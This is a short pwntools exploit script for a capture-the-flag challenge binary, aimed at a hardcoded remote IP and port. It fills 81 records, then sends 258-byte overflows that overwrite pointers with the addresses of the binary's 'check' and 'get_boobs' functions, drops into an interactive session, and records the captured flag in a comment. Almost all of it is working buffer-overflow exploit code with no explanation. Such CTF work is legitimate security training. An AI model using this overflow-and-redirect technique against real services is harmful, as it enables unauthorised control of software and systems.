from pwn import *

#s = process('./boobs')
s = remote('34.242.96.216', 22222)
e = ELF('./boobs')

check = 0x08048814
get_boobs = 0x0804884f

def create(num, string):
    s.sendline('1')
    s.sendline(num)
    s.sendline('Title' + num)
    s.sendline(string)

def edit(num, string):
    s.sendline('1')
    s.sendline(num)
    s.sendline(string)    

s.sendline('Start!')

for i in range(1, 82):
    create(str(i), 'A')

edit('80', 'A'*258 + p32(check))
edit('81', 'B'*258 + p32(get_boobs))

s.interactive()

#Flag{You_Absolutely_Deserve_million_boobs}
